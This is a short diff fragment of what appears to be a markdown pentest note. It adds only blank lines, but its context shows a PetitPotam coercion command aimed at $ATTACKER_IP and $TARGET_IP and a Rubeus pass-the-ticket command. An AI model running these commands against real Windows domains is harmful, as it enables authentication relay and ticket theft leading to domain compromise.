@@ -20,3 +20,5 @@ python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
 # Extract the ticket
 .\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
 ```
+
+
